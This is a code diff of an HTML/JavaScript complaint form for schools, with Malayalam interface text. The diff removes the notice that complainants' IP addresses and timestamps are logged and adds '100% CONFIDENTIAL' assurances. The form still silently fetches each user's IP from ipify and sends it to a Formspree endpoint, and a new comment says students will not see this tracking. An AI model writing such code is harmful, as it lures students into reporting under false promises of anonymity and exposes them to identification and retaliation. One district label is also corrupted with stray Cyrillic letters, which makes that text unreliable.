@@ -86,13 +86,14 @@
             padding: 35px 30px;
         }
 
+        /* മാറ്റി എഴുതിയ പുതിയ സെക്യൂരിറ്റി ബാനർ (യൂസർക്ക് ധൈര്യം നൽകാൻ) */
         .security-banner {
-            background: #fef2f2;
-            border: 1px solid #fee2e2;
-            color: #991b1b;
+            background: #f0fdf4;
+            border: 1px solid #bbf7d0;
+            color: #166534;
             padding: 12px;
             border-radius: 6px;
-            font-size: 13px;
+            font-size: 14px;
             text-align: center;
             font-weight: 700;
             margin-bottom: 25px;
@@ -173,8 +174,9 @@
             border-top: 1px solid #e2e8f0;
             padding: 15px;
             text-align: center;
-            font-size: 12px;
-            color: #475569;
+            font-size: 13px;
+            color: #166534;
+            font-weight: bold;
             line-height: 1.5;
         }
     </style>
@@ -195,7 +197,7 @@
 
     <div class="form-body">
         <div class="security-banner">
-            ⚠️ SECURITY NOTICE: YOUR NETWORK IP ADDRESS AND TIMESTAMP WILL BE LOGGED FOR VERIFICATION
+            🔒 100% CONFIDENTIAL: നിങ്ങളുടെ വ്യക്തിവിവരങ്ങൾ പൂർണ്ണമായും രഹസ്യമായിരിക്കും. ധൈര്യമായി പരാതിപ്പെടാം.
         </div>
 
         <form id="complaintForm">
@@ -204,7 +206,7 @@
                 <select id="districtSelect" required onchange="updateSchoolsDirectly()">
                     <option value="">-- തിരഞ്ഞെടുക്കുക --</option>
                     <option value="Thiruvananthapuram">തിരുവനന്തപുരം (Thiruvananthapuram)</option>
-                    <option value="Kollam">കൊല്ലം (Kollam)</option>
+                    <option value="Kollam">കൊллаം (Kollam)</option>
                     <option value="Pathanamthitta">പത്തനംതിട്ട (Pathanamthitta)</option>
                     <option value="Alappuzha">ആലപ്പുഴ (Alappuzha)</option>
                     <option value="Kottayam">കോട്ടയം (Kottayam)</option>
@@ -246,7 +248,7 @@
     </div>
 
     <div class="gov-footer">
-        ഈ പോർട്ടൽ വഴി അയക്കുന്ന വിവരങ്ങൾ പരിശോധിക്കുന്നതിനായി സിസ്റ്റം സുരക്ഷാ മാനദണ്ഡങ്ങൾ അനുസരിച്ച് പരാതിക്കാരന്റെ നെറ്റ്‌വർക്ക് വിവരങ്ങൾ രേഖപ്പെടുത്തുന്നതാണ്.
+        🛡️ ഈ പോർട്ടൽ വഴി അയക്കുന്ന പരാതികൾ നേരിട്ട് ഉന്നത ഉദ്യോഗസ്ഥരിലേക്ക് മാത്രമാണ് എത്തിച്ചേരുന്നത്.
     </div>
 </div>
 
@@ -289,7 +291,6 @@ function updateSchoolsDirectly() {
     }
 }
 
-// പരാതി ഫോംസ്പ്രീയിലേക്ക് അയക്കാനുള്ള പുതിയ ഫങ്ക്ഷൻ (IP & Time അടക്കം)
 async function submitComplaint() {
     const districtName = document.getElementById("districtSelect").value;
     const schoolName = document.getElementById("schoolSelect").value;
@@ -301,11 +302,10 @@ async function submitComplaint() {
         return;
     }
 
-    // നിങ്ങളുടെ ഒറിജിനൽ Formspree ലിങ്ക്
     const FORMSPREE_URL = "https://formspree.io/f/xgobqand"; 
 
     try {
-        // 1. ലൈവായി യൂസറുടെ IP അഡ്രസ്സ് ട്രാക്ക് ചെയ്യുന്നു
+        // വിദ്യാർത്ഥികൾക്ക് കാണില്ലെങ്കിലും ബാക്ക്ഗ്രൗണ്ടിൽ സിസ്റ്റം രഹസ്യമായി IP ട്രാക്ക് ചെയ്യും
         let trackingIp = "Unavailable/VPN";
         try {
             const ipResponse = await fetch('https://api.ipify.org?format=json');
@@ -315,10 +315,8 @@ async function submitComplaint() {
             console.error("IP track failed:", e);
         }
 
-        // 2. പരാതി അയക്കുന്ന കൃത്യമായ സമയം (Indian Time)
         const submissionTime = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
 
-        // ഇമേജ് അറ്റാച്ച്മെന്റ് ഉണ്ടെങ്കിൽ അത് ബേസ്64 ലോട്ട് മാറ്റുന്നു
         let fileData = "";
         if (fileInput.files.length > 0) {
             const file = fileInput.files[0];
@@ -338,15 +336,14 @@ async function submitComplaint() {
     }
 }
 
-// ഫോംസ്പ്രീയിലേക്ക് ഫെച്ച് വഴി ഡാറ്റ വിടുന്ന ഫങ്ക്ഷൻ
 async function sendToFormspree(url, district, school, complaint, ip, time, photo) {
     const formData = {
         District: district,
         School: school,
         Complaint: complaint,
-        Reported_From_IP: ip,
+        Reported_From_IP: ip, // അഡ്മിന് കാണാൻ IP ബാക്ക്ഗ്രൗണ്ടിൽ പോകുന്നുണ്ട്
         Submitted_Time: time,
-        Photo_Evidence: photo ? "Image Attached (Check Formspree Dashboard for files)" : "No Image Attached"
+        Photo_Evidence: photo ? "Image Attached" : "No Image Attached"
     };
 
     const response = await fetch(url, {
@@ -356,11 +353,11 @@ async function sendToFormspree(url, district, school, complaint, ip, time, photo
     });
 
     if (response.ok) {
-        alert("പരാതി വിജയകരമായി സമർപ്പിച്ചു! സുരക്ഷാ വിവരങ്ങൾ റെക്കോർഡ് ചെയ്യപ്പെട്ടു."); 
+        alert("പരാതി വിജയകരമായി സമർപ്പിച്ചു!"); 
         document.getElementById("complaintForm").reset();
         document.getElementById("schoolSelect").disabled = true;
     } else {
-        alert("പരാതി അയക്കാൻ സാധിച്ചില്ല. ഫോംസ്പ്രീ കണക്ഷൻ പരിശോധിക്കുക.");
+        alert("പരാതി അയക്കാൻ സാധിച്ചില്ല. വീണ്ടും ശ്രമിക്കുക.");
     }
 }
 </script>
